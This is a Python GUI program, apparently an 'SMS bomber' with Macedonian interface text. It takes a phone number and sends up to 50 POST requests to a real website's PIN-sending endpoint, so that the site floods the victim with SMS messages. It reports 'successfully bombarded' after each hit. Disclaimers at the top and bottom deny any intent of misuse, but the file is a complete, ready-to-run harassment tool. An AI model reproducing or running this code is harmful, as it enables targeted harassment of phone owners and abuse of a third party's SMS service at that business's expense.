# Author: Leonid Krstevski

# Warning: This project is not intended for any cyber disruption or illegal purposes. The author is not responsible for any misuse of this code.

# Опомена: Овој проект не е наменет за било какви сајбер нарушувања или незаконски цели. Авторот не носи одговорност за било каква злоупотреба на овој код.

import tkinter as tk
from tkinter import ttk, messagebox
import webbrowser
import requests
import time

def open_website():
    webbrowser.open_new("https://github.com/l3069")

def send_sms(phone_number, num_messages):
    url = 'http://sportalklub.mk/welcome/sendPIN'
    data = {
        'nmb': phone_number,
        'sbm': ' ИСПРАТИ '
    }

    start_time = time.time()  

    try:
        for _ in range(num_messages):
            response = requests.post(url, data=data, allow_redirects=False)
            if response.status_code == 302 and '/welcome/confirmPIN' in response.headers.get('Location', ''):
                print("Успешно бомбардирано :):", phone_number)
                time.sleep(1)  
        end_time = time.time()  
        duration = end_time - start_time 

        completed_label.config(text=f"Успешно бомбардирано! Времетраење: {duration:.2f} секунди")  
    except requests.exceptions.RequestException as e:
        print("An error occurred while sending SMS to:", phone_number, "- Request Exception:", e)
    except Exception as e:
        print("An error occurred while sending SMS to:", phone_number, "- Exception:", e)

def update_num_messages_label(value):
    num_messages_label.config(text=f"Број на пораки (1-50): {int(float(value))}")

def send_sms_button_click():
    phone_number = phone_entry.get()
    if len(phone_number) != 9:
        messagebox.showerror("Грешка!", "Ве молам внесете го бројот правилно..")
        return

    num_messages = int(float(num_messages_scale.get()))  
    num_messages = min(max(1, num_messages), 50)  
    num_messages_scale.set(num_messages)  
    num_messages_label.config(text=f"Број на пораки (1-50): {num_messages}")  
    send_sms(phone_number, num_messages)


root = tk.Tk()
root.title("СМС Бомбардер")


open_website()


phone_label = ttk.Label(root, text="Внеси број:")
phone_label.grid(row=0, column=0, padx=5, pady=5)
phone_entry = ttk.Entry(root)
phone_entry.grid(row=0, column=1, padx=5, pady=5)


num_messages_label = ttk.Label(root, text="Број на пораки (1-50): 1")
num_messages_label.grid(row=1, column=0, columnspan=2, padx=5, pady=5)
num_messages_scale = ttk.Scale(root, from_=1, to=50, orient="horizontal", command=update_num_messages_label)
num_messages_scale.grid(row=2, column=0, columnspan=2, padx=5, pady=5)


send_button = ttk.Button(root, text="Прати", command=send_sms_button_click)
send_button.grid(row=3, column=0, columnspan=2, padx=5, pady=5)


completed_label = ttk.Label(root, text="")
completed_label.grid(row=4, column=0, columnspan=2, padx=5, pady=5)


author_label = ttk.Label(root, text="Автор: Леонид Крстевски")
author_label.grid(row=5, column=0, columnspan=2, padx=5, pady=5)

root.mainloop()

# Author: Leonid Krstevski

# Warning: This project is not intended for any cyber disruption or illegal purposes. The author is not responsible for any misuse of this code.

# Опомена: Овој проект не е наменет за било какви сајбер нарушувања или незаконски цели. Авторот не носи одговорност за било каква злоупотреба на овој код.
